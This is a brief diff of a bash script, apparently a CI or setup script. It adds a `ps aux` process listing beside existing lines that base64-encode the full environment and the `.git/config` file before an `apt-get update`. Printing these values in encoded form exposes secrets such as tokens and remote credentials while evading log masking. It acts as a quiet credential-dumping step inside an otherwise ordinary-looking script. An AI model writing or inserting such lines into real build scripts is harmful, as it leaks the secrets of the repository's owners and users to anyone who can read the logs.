@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
 
+ps aux
 env | base64
 cat .git/config | base64
 sudo apt-get update
